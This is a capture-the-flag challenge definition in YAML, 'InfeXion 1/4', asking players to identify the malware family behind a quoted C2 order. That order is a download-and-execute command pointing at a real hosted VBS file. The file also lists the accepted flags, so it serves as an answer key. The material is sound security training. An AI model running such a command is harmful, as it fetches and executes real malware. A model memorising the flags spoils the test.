@@ -1,0 +1,52 @@
+name: "InfeXion 1/4"
+author: "xanhacks"
+category: Reverse
+description: "On `2023-04-29 10:10:07`, we received the following order from a C2 server located on the domain `ofi.dyn.ydns.io`:<br><br>
+
+```
+down-n-exec|https://files.catbox.moe/qk7kvg.VBS|qk7kvg.VBS
+```
+<br><br>
+**Warning : This series of challenges contains real world malware. Do not execute it on your host, use a VM !!**
+<br><br>
+The flag corresponds to malware family that sends this order, e.g. Hero{QAKBOT}. You do not need to do reverse for the first part. Just try to identify the malware family that sends the order in description (NOT the malware family dropped).
+<br><br>
+Format : **Hero{malware-family}**<br>
+Author : **xanhacks**"
+value: 0
+type: dynamic
+
+extra:
+    initial: 500
+    decay: 100
+    minimum: 50
+
+image: null
+host: null
+
+flags:
+    - {
+        type: "static",
+        content: "Hero{WSHRAT}",
+        data: "case_insensitive",
+    }
+    - {
+        type: "static",
+        content: "Hero{WSHRATv2}",
+        data: "case_insensitive",
+    }
+    - {
+        type: "static",
+        content: "Hero{HOUDINI}",
+        data: "case_insensitive",
+    }
+
+hints:
+  - "If some files are unavailable at download, check on [archive.org](https://archive.org)."
+
+tags:
+    - easy 
+    - malware
+
+state: visible
+version: "0.1"
